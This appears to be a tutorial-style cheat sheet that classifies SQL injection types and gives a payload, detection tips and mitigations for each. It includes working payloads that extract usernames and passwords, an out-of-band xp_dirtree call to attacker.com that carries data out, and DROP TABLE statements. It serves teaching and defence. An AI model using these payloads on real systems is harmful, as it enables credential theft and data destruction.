
<img width="1198" height="586" alt="S" src="https://github.com/user-attachments/assets/aa202b57-8792-4ebf-a893-198faf5ead40" />

## 1. In-Band SQL Injection

Attack and data retrieval occur over the **same channel**. These are often easiest to exploit.

### 1.1 Union-Based SQLi

**⇢** Combines attacker-controlled SELECT queries with the application’s original query via the `UNION` operator.
**Mechanism.** If the number and data types of columns in the injected `SELECT` match the original query, the database returns both result sets concatenated.

**Example Payload**

1. Determine column count:

   ```
   ' ORDER BY 1--  
   ' ORDER BY 2--  
   …  
   ' ORDER BY 5--  (error when 5 > columns)
   ```
2. Extract data:

   ```sql
   ' UNION SELECT NULL, username, password FROM users-- 
   ```

   If the original query was `SELECT id,name,price FROM products…`, the injected query returns `username,password` in place of `id,name`.

**Detection**

* Test `UNION SELECT NULL,NULL,…` with increasing `NULL` placeholders until no “column count” error.
* Observe application output for injected data.

**➥**

* Requires knowledge of column count and compatible data types.
* Can be blocked by strict input validation and parameterized queries.

---

### 1.2 Error-Based SQLi

**⇢** Forces the database to generate error messages that reveal data or schema details.
**Mechanism.** Inject expressions that cause type conversion or syntax errors, embedding subqueries whose results appear in the error.

**Example Payload**

```sql
' AND 1=CONVERT(int, (SELECT @@version))--  
```

If the database returns a conversion error, the message includes the server version string.

**Detection**

* Inject malformed expressions (e.g., `AND 1=CONVERT(int, 'a')`) and examine returned error details.
* Enable verbose errors in a test environment.

**➥**

* Reliant on the application displaying raw database errors.
* Suppress error messages or use generic error pages to mitigate.

---

## 2. Blind SQL Injection

No data is directly returned. Attackers infer information by observing changes in application behavior.

### 2.1 Boolean-Based (Content-Based) Blind

**⇢** Sends payloads that evaluate to TRUE or FALSE and infers data based on content differences in the HTTP response.

**Mechanism.**

```
?id=1 AND 1=1--   → page normal (TRUE)  
?id=1 AND 1=2--   → page differs or returns “no results” (FALSE)  
```

**Example: Extracting one character at a time**

```sql
?id=1 AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--  
```

If the first character of the password is `a`, the page behaves like the TRUE case.

**Detection**

* Compare response bodies or status codes between known-true and known-false conditions.
* Use automated tools to iterate through ASCII values.

**➥**

* Slower than in-band; values must be extracted character by character.
* Prevent by enforcing parameterized queries and uniform error/content responses.

---

### 2.2 Time-Based Blind

**⇢** Uses database delay functions (`SLEEP`, `WAITFOR`) to infer TRUE/FALSE from response time.

**Mechanism.**

```
?id=1 OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77, SLEEP(5), 0)--  
```

If the condition is true, the server delays 5 seconds; otherwise, responds immediately.

**Example Payloads**

* **MySQL:** `… OR IF(condition, SLEEP(5), 0)--`
* **MSSQL:** `…; IF(condition) WAITFOR DELAY '0:0:5'--`
* **PostgreSQL:** `…; SELECT CASE WHEN condition THEN pg_sleep(5) END--`

**Detection**

* Measure response times programmatically.
* Automate bitwise extraction of sensitive values.

**➥**

* Reliable when errors are suppressed.
* Mitigation: consistent response times, parameterized queries.

---

## 3. Out-of-Band (OOB) SQL Injection

Used when in-band and blind techniques are ineffective. Relies on the database server’s network capabilities to send data to an attacker-controlled host.

**⇢** The injected SQL causes the database to make an HTTP or DNS request to an external server, carrying data in the request.

**Example Payload (MSSQL)**

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--  
```

When executed, the server attempts to enumerate the UNC path, causing a DNS lookup to `attacker.com`, revealing data in the hostname or path.

**Detection**

* Monitor DNS or HTTP logs on your controlled endpoint.
* Use unique subdomains for each query (e.g., `a1.attacker.com`, `a2.attacker.com`) to reconstruct data.

**➥**

* Requires outbound network connectivity from the database server.
* Can be blocked by egress filtering and strict network controls.

---

## 4. Second-Order SQL Injection

**⇢** The attacker injects a malicious payload that is **stored** by the application (e.g., in a user profile) and **later** executed in another context.

**Mechanism.**

1. User registration form stores the payload in the database.
2. At a later stage—such as an admin viewing reports—the stored payload is concatenated into a query and executed.

**Example Scenario**

* **Step 1:** Insert `joe'); DROP TABLE orders;--` as a user’s display name.
* **Step 2:** The application later runs:

  ```sql
  SELECT * FROM users WHERE name = '[stored name]';
  ```

  Without sanitization, the stored payload executes, dropping the `orders` table.

**Detection**

* Audit stored data for SQL meta-characters (`'`, `;`, `--`).
* Review code paths that retrieve and re-execute stored values in SQL contexts.

**➥**

* Prevent by sanitizing inputs on both insertion and retrieval, and using parameterized queries throughout.

---

## 5. Stacked (Piggy-Backed) Queries

**⇢** Executes multiple SQL statements in one request by separating them with `;`.

**Mechanism.**

```sql
?id=1; DROP TABLE users;--  
```

If the database driver allows stacked queries, the first query retrieves data and the second executes destructive actions.

**Detection**

* Test with `; DROP TABLE test;--` in inputs.
* Confirm whether the database driver supports multiple statements.

**➥**

* Many modern database APIs disable stacked queries by default.
* Always use prepared statements, which typically forbid stacking.
